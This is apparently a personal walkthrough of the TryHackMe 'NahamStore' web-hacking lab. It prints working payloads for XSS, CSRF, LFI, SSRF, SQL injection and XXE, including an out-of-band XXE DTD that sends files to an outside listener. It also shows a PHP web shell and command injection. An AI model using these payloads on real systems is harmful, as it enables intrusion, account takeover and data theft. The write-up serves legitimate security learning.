# NahamStore

**Platform:** TryHackMe
**Date:** 2026-09-15
**Difficulty:** Medium
**Category:** Web / Bug Bounty
**Room URL:** TryHackMe — NahamStore
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

> NahamStore is basically a full bug bounty-style web application where I had to find and exploit multiple web vulnerabilities across different parts of the application. This included XSS, CSRF, IDOR, LFI, SSRF, XXE, RCE and SQL injection.

> This room was less about finding one vulnerability and more about learning how different vulnerabilities can chain together to expose more and more of an application.

---

## 🔍 Reconnaissance

> As usual, I started with recon. I first scanned the target to see what ports and services were exposed.

### Nmap Scan

```
nmap -sV -p- -T4 10.10.132.254
```

**Results:**

|Port|Service|Version|Notes|
|---|---|---|---|
|22|SSH|OpenSSH|SSH exposed|
|80|HTTP|Web server|Main NahamStore application|

> The main target was running a web application, so from there I focused on discovering subdomains, virtual hosts and different endpoints.

### Virtual Host Enumeration

I used `ffuf` to look for additional virtual hosts:

```
ffuf -u http://nahamstore.thm \
-c \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-H 'Host: FUZZ.nahamstore.thm' \
-fw 125
```

I found:

```
shop
www
marketing
stock
```

So I added the domains to `/etc/hosts`:

```
10.10.132.254 nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm shop.nahamstore.thm nahamstore-2020.nahamstore.thm www.nahamstore.thm
```

> At this point I had several different applications to investigate instead of just one website.

---

# 🧭 Steps I Took

## Step 1 — Enumerating the Customer API

After getting further into the room, I discovered another development subdomain:

```
nahamstore-2020-dev.nahamstore.thm
```

I fuzzed it for directories:

```
ffuf -u 'http://nahamstore-2020-dev.nahamstore.thm/FUZZ' \
-c \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
```

This found:

```
api
```

I then fuzzed the API:

```
ffuf -u 'http://nahamstore-2020-dev.nahamstore.thm/api/FUZZ' \
-c \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
```

And found:

```
customers
```

When I visited the endpoint without a parameter, it told me:

```
customer_id is required
```

So I supplied one:

```
curl 'http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=1' -s | jq
```

I got customer information including:

```
{
  "id": 1,
  "name": "Rita Miles",
  "email": "rita.miles969@gmail.com",
  "tel": "816-719-7115",
  "ssn": "366-24-2649"
}
```

> I could then enumerate customer IDs and find information belonging to other customers.

**Why it matters:**

> An API exposing sensitive customer information based only on a sequential ID is a massive access-control problem. It also gave me another example of why API endpoints should be tested separately from the main application.

---

# Step 2 — Finding Reflected XSS

The marketing subdomain was interesting because campaign IDs were used in the URL.

I fuzzed the application:

```
ffuf -u http://marketing.nahamstore.thm/FUZZ \
-c \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-ic
```

I eventually found campaign-looking values that redirected to:

```
/?error=Campaign+Not+Found
```

I could also trigger the same behavior by modifying an existing campaign ID.

For example:

```
8d1952ba2b3c6dcd76236f090ab8642c
```

became:

```
8d1952ba2b3c6dcd76236f090ab8642a
```

The application redirected me to:

```
/?error=Campaign+Not+Found
```

The interesting part was that the `error` parameter was reflected onto the page.

So I tested XSS:

```
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

And it executed.

> This confirmed a reflected XSS vulnerability.

**Why it matters:**

> The application was taking data from the URL and putting it directly into the page without properly escaping it. That means an attacker could potentially make a specially crafted URL execute JavaScript in another user's browser.

---

# Step 3 — Stored XSS Through the User-Agent

Next I looked for places where the application stored information and displayed it later.

On the order summary page, the **User-Agent** value was displayed.

That immediately made it interesting because the User-Agent is completely controllable from the HTTP request.

I sent an XSS payload through the User-Agent and confirmed that it executed when the order information was displayed.

**Why it matters:**

> This is different from reflected XSS because the malicious input can be stored by the application and executed later when somebody views the affected page.

---

# Step 4 — Escaping an HTML `<title>` Tag

On a product page, I noticed the product name was controlled through a GET parameter:

```
/product?id=1&name=Hoodie+%2B+Tee
```

The interesting part was that the value was inserted into the HTML `<title>` element.

So instead of trying to inject JavaScript normally, I first escaped the existing HTML context:

```
</title><script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

URL encoded, this became:

```
/product?id=1&name=%3C/title%3E%3Cscript%3Ealert(document.domain.concat(%22\n%22).concat(window.origin))%3C/script%3E
```

The payload executed.

> The important part here was understanding the context. I wasn't just injecting `<script>` randomly — I first had to break out of the existing `<title>` tag.

---

# Step 5 — XSS Inside a JavaScript Variable

The `/search` page had some interesting JavaScript:

```
var search = '';
$.get('/search-products?q=' + search,function(resp){
```

So the search value was being inserted into JavaScript.

That meant I needed to escape the JavaScript string rather than simply injecting an HTML tag.

I tested:

```
/search?q=%27%2Balert(document.domain.concat(%22\n%22).concat(window.origin))%2B%27
```

The important thing here was URL encoding the `+` character as `%2B`.

> This was another good reminder that XSS depends heavily on the context where the input lands. HTML, JavaScript, attributes and URLs all need to be approached differently.

---

# Step 6 — Hidden Search Parameter

I inspected the search form:

```
<form method="get" action="/search">
    <input class="form-control" name="q" placeholder="Search For Products" value="">
</form>
```

This showed me that the `q` parameter was being sent to `/search`.

I then tested the backend endpoint directly:

```
/search-product?q=<payload>
```

This gave another way to reach the vulnerable functionality.

**Why it matters:**

> Hidden or undocumented parameters are worth looking for during web enumeration. Just because a parameter isn't obvious from the UI doesn't mean the backend doesn't accept it.

---

# Step 7 — XSS Through the Return Form

The return form contained:

```
<textarea name="return_info" class="form-control"></textarea>
```

The `return_info` value was reflected inside the `<textarea>`.

So I escaped the textarea first:

```
</textarea><script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

This executed as XSS.

> Again, the trick was escaping the HTML context before injecting the actual JavaScript.

---

# Step 8 — XSS Through a Nonexistent Endpoint

I noticed that nonexistent pages reflected the requested path.

For example, requesting something like:

```
/noraj
```

returned an error page containing:

```
Sorry, we couldn't find /noraj anywhere
```

Since the path itself was reflected, I tested an encoded XSS payload:

```
/%3Cscript%3Ealert(document.domain.concat(%22/n%22).concat(window.origin))%3C/script%3E
```

This gave me another reflected XSS.

---

# Step 9 — XSS Through a Hidden `discount` Parameter

On a product page there was a discount code input:

```
<input placeholder="Discount Code"
       class="form-control"
       name="discount"
       value="">
```

The interesting part was that `discount` was expected as a POST parameter, but supplying it through GET caused it to be reflected into the `value` attribute.

That meant I could escape the attribute:

```
" autofocus onfocus=alert(document.domain.concat("\n").concat(window.origin)) a="
```

URL encoded:

```
/product?id=1&added=1&discount=%22%20autofocus%20onfocus=alert(document.domain.concat(%22\n%22).concat(window.origin))%20a=%22
```

> This one was a good example of why I like checking both GET and POST parameters. A parameter may behave differently depending on where it comes from.

---

# Step 10 — Open Redirects

I found two separate open redirects.

### Open Redirect #1

I fuzzed parameter names:

```
ffuf -u 'http://nahamstore.thm/?FUZZ=https://example.com' \
-c \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-fs 4254
```

This revealed:

```
r
```

So:

```
/?r=https://example.com
```

redirected the browser to the supplied external URL.

### Open Redirect #2

When trying to access an authenticated page, the application redirected me to the login page with a parameter like:

```
/login?redirect_url=/account/settings
```

I changed the value to an external URL:

```
/login?redirect_url=https://example.com
```

After authentication, the application redirected me there.

**Why it matters:**

> Open redirects can be abused for phishing and can also become more dangerous when combined with other vulnerabilities.

---

# Step 11 — CSRF

I checked the password-change functionality:

```
/account/settings/password
```

There was no CSRF token protecting the request.

So I created a basic CSRF proof of concept:

```
<html>
  <body>
    <form action="http://nahamstore.thm/account/settings/password">
      <input type="submit" value="Submit request" />
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

> The important thing here was that the application accepted a state-changing request without verifying that it actually came from the legitimate application.

### Weak CSRF Protection

The email-change page did have a CSRF parameter:

```
<input type="hidden" name="csrf_protect" value="...">
```

A fake value failed.

But removing the parameter entirely bypassed the protection.

> So technically there was a CSRF mechanism, but the application wasn't enforcing it properly.

### Weak Account Disable Protection

The account disable page used:

```
<input type="hidden" name="csrf_disable_protect" value="NA==">
```

Decoding it:

```
printf %s 'NA==' | base64 -d
```

gave:

```
4
```

> The protection was basically just the user ID encoded with Base64, which isn't a security mechanism because Base64 is reversible.

---

# Step 12 — IDOR

Next I tested for insecure direct object references.

The first IDOR involved customer addresses.

After placing an order and selecting an address, the request contained:

```
address_id=5
```

I changed the ID and replayed the request.

> This allowed me to access another address, showing that the application wasn't properly checking whether the requested address actually belonged to my account.

### Order PDF IDOR

The PDF receipt functionality used:

```
<form method="post" action="/pdf-generator">
    <input type="hidden" name="what" value="order">
    <input type="hidden" name="id" value="4">
</form>
```

The request looked like:

```
what=order&id=4
```

Changing the ID:

```
what=order&id=3
```

returned:

```
Order does not belong to this user_id
```

I also tested manipulating the parameter structure:

```
what=order&id=3%26user_id=3
```

> This was another example of testing whether the backend was actually enforcing authorization rather than trusting an ID supplied by the client.

---

# Step 13 — Local File Inclusion

Product images were loaded through:

```
/product/picture/?file=cbf45788a7c3ff5c2fab3cbe740595d4.jpg
```

This immediately made the `file` parameter interesting.

Normal traversal didn't work, so I tested a filter bypass using duplicated traversal characters:

```
....//....//....//....//....//....//lfi/flag.txt
```

The application accepted the traversal and exposed the local file.

> This showed that a simple blacklist for `../` isn't enough to prevent path traversal/LFI.

---

# Step 14 — SSRF

The product page had a **Check Stock** function.

The request contained:

```
product_id=2&server=stock.nahamstore.thm
```

The `server` parameter looked like it controlled where the backend made its request.

I first tried changing the hostname, but the application rejected invalid server names.

So I tested URL parsing behavior:

```
stock.nahamstore.thm@127.0.0.1
```

This reached:

```
127.0.0.1
```

I then added a fragment:

```
stock.nahamstore.thm@127.0.0.1#
```

This allowed me to control the destination while preventing the application from appending its normal path.

### Finding the Internal API

I fuzzed internal subdomains:

```
ffuf -u 'http://nahamstore.thm/stockcheck' \
-c \
-w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt \
-X POST \
-d 'product_id=2&server=stock.nahamstore.thm@FUZZ.nahamstore.thm#'
```

I found:

```
internal-api.nahamstore.thm
```

Querying it gave:

```
{
  "server": "internal-api.nahamstore.com",
  "endpoints": ["/orders"]
}
```

So I queried:

```
/orders
```

and got several order IDs.

One of them returned customer and order information, including:

```
{
  "id": "5ae19241b4b55a360e677fdd9084c21c",
  "customer": {
    "id": 2,
    "name": "Jimmy Jones",
    "email": "jd.jones1997@yahoo.com",
    "tel": "501-392-5473",
    "address": {
      "city": "Englewood",
      "state": "Colorado",
      "zipcode": "80112"
    }
  }
}
```

> This was a really good SSRF example because I wasn't just making the server request another public website. I was using it to reach an internal service that wasn't directly exposed to me.

---

# Step 15 — XXE

The stock service exposed:

```
/product/1
```

A normal GET request returned:

```
{
  "id": 1,
  "name": "Hoodie + Tee",
  "stock": 56
}
```

When I switched to POST:

```
curl -X POST http://stock.nahamstore.thm/product/1
```

I got:

```
Missing header X-Token
```

Adding a fake header:

```
curl -X POST 'http://stock.nahamstore.thm/product/1' \
-H 'X-Token: xxx'
```

returned:

```
X-Token xxx is invalid
```

So I moved to Burp and started looking at how the application processed the request.

Adding the `xml` parameter caused the application to expect XML:

```
POST /product/1?xml
```

I sent:

```
<?xml version="1.0"?>
<data></data>
```

and got:

```
X-Token not supplied
```

This was interesting because I had already supplied an HTTP header.

That suggested the application was reading the token from the XML body instead.

I tried:

```
<?xml version="1.0"?>
<data>
    <X-Token>noraj</X-Token>
</data>
```

and got:

```
X-Token noraj is invalid
```

The value was being reflected.

That immediately made XXE worth testing.

I confirmed entity expansion with:

```
<?xml version="1.0"?>
<!DOCTYPE replace [
    <!ENTITY xxe "noraj">
]>
<data>
    <X-Token>&xxe;</X-Token>
</data>
```

The result was the same, confirming that the XML parser was processing entities.

### Local File Disclosure

I then tested reading a local file:

```
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ELEMENT data ANY>
    <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<data>
    <X-Token>&xxe;</X-Token>
</data>
```

The contents of `/etc/passwd` were reflected in the response.

> That confirmed a full local file disclosure through XXE.

From there, the obvious next target was:

```
/flag.txt
```

---

# Step 16 — Out-of-Band XXE Through XLSX

There was also an upload function at:

```
/staff
```

that accepted XLSX files.

An XLSX file is essentially a ZIP archive containing XML files, so I extracted one:

```
7z x -oXXE xxe.xlsx
```

I modified:

```
xl/workbook.xml
```

to include an external entity.

The idea was to make the vulnerable parser contact my server and retrieve the file out-of-band.

I rebuilt the XLSX:

```
cd XXE
7z u ../xxe.xlsx *
```

I then created a remote DTD:

```
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.9.19.77:2121/%d;'>">
```

And started the XXE server:

```
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

At first I didn't get useful data.

So I changed the DTD to read the flag through PHP's stream wrapper and Base64-encode it:

```
php://filter/convert.base64-encode/resource=/flag.txt
```

This time the server received the data.

I decoded the Base64 output:

```
printf %s 'e2Q2<EDITED>hmfQo=' | base64 -d
```

and recovered the flag.

> The important thing I learned here was that XXE doesn't always have to return the file contents directly. If the application doesn't reflect the data, an out-of-band channel can be used instead.

---

# Step 17 — RCE Through the Admin Panel

After more enumeration I found:

```
/admin
```

using:

```
ffuf -u 'http://nahamstore.thm:8000/FUZZ' \
-c \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
```

I found:

```
admin
```

The admin login accepted:

```
admin / admin
```

The panel allowed me to modify templates used by the marketing application.

That meant I could potentially inject PHP code into a template.

I replaced a description section with a simple PHP command-execution payload:

```
<?php

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
    die;
}

?>
```

After the template was saved, I could supply a command through:

```
?cmd=id
```

and get command output.

> This gave me RCE because the application was taking template content that I could modify and executing it as PHP.

---

# Step 18 — Blind RCE Through the PDF Generator

There was another interesting vulnerability in the PDF generator.

The `id` parameter was being passed into a command, which meant command injection was possible.

The vulnerable request looked like:

```
what=order&id=4$(...)
```

I used the injection to obtain command execution and then inspected:

```
/etc/hosts
```

The hosts file contained several internal services:

```
127.0.0.1       nahamstore.thm
127.0.0.1       www.nahamstore.thm
172.17.0.1      stock.nahamstore.thm
172.17.0.1      marketing.nahamstore.thm
172.17.0.1      shop.nahamstore.thm
172.17.0.1      nahamstore-2020.nahamstore.thm
172.17.0.1      nahamstore-2020-dev.nahamstore.thm
10.131.104.72   internal-api.nahamstore.thm
```

> This connected a lot of the earlier recon together. The domains I had been discovering weren't random — they were internal services communicating with each other.

---

# Step 19 — In-Band SQL Injection

The first SQL injection was on the product `id` parameter.

I tested:

```
/product?id='
```

and received a MySQL syntax error.

That immediately confirmed SQL injection.

I then tested the number of columns and eventually used:

```
0 UNION SELECT 1,flag,3,4,5 FROM sqli_one-- -
```

This allowed the flag to be retrieved directly from the database.

**Why it matters:**

> Error messages are extremely useful during SQLi testing. Even though they shouldn't be exposed in production, here the database error basically told me that my input was reaching the SQL query.

---

# Step 20 — Inferential SQL Injection

The second SQL injection was much less obvious.

It was inside the return request:

```
POST /returns
```

The request contained parameters including:

```
order_number
return_reason
return_info
```

Instead of manually testing every possibility, I saved the request to a file and passed it to `sqlmap`:

```
sqlmap -r $(pwd)/req.txt \
--level 5 \
--risk 3 \
--batch \
--threads 10 \
-D nahamstore \
-T sqli_two \
-C flag \
--dump
```

`sqlmap` was able to identify and exploit the inferential SQL injection and retrieve the flag.

> This was a good example of where automation actually made sense. I already had a suspicious request, but manually extracting a blind SQLi would have taken much longer.

---

## 🛠 Commands Used

|Command|What It Does|
|---|---|
|`nmap -sV -p- -T4 <IP>`|Full port scan with service/version detection|
|`ffuf -u ...`|Fuzzes directories, parameters or virtual hosts|
|`curl <URL>`|Sends HTTP requests from the command line|
|`jq`|Formats JSON output|
|`7z x`|Extracts an XLSX/ZIP archive|
|`7z u`|Updates/rebuilds the XLSX archive|
|`xxeserv`|Helps test out-of-band XXE|
|`sqlmap -r req.txt`|Tests a saved HTTP request for SQL injection|
|`base64 -d`|Decodes Base64 data|

---

## 📎 Resources Used

- TryHackMe — NahamStore
- SecLists
- Burp Suite
- PayloadsAllTheThings
- SQLMap

---